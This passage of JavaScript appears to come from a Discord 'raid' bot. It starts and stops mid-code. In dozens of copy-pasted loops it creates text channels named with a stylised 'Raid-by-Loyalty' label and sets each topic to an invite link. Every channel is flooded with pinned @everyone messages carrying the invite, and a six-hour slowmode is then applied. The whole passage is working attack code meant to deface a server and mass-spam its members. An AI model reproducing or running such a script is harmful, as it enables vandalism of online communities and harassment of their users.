    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            /////////////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ////////////////////////////////////

           for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ///////////////////////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////////////////////

        for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
